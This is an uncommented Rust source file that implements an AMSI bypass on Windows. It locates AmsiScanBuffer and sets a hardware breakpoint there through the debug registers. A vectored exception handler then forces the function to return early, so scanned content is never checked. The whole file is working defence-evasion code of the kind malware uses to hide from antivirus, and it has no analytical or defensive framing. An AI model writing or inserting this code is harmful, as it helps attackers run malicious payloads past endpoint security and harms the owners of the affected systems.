#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::EXCEPTION_SINGLE_STEP,
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, EXCEPTION_POINTERS,
            SetThreadContext, GetThreadContext, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
        },
        Threading::GetCurrentThread,
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
    },
};

#[cfg(target_os = "windows")]
static mut AMSI_ADDR: usize = 0;

#[cfg(target_os = "windows")]
pub unsafe fn install_amsi_bypass() {
    let mut amsi = GetModuleHandleA(b"amsi.dll\0".as_ptr());
    if amsi == 0 {
        LoadLibraryA(b"amsi.dll\0".as_ptr());
        amsi = GetModuleHandleA(b"amsi.dll\0".as_ptr());
        if amsi == 0 { return; }
    }
    let scan_buffer = GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr());
    AMSI_ADDR = core::mem::transmute::<_, usize>(scan_buffer);

    AddVectoredExceptionHandler(1, Some(amsi_veh_handler));

    let thread = GetCurrentThread();
    let mut ctx: CONTEXT = core::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    GetThreadContext(thread, &mut ctx);
    ctx.Dr0 = AMSI_ADDR as u64;
    ctx.Dr7 |= 0x1;
    SetThreadContext(thread, &ctx);
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn amsi_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 =  0;

    let record  = &*(*info).ExceptionRecord;
    let context = &mut *(*info).ContextRecord;

    if record.ExceptionCode == EXCEPTION_SINGLE_STEP
        && context.Rip == AMSI_ADDR as u64
    {
        context.Rax = 0;
        context.Rip = *(context.Rsp as *const u64);
        context.Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    EXCEPTION_CONTINUE_SEARCH
}
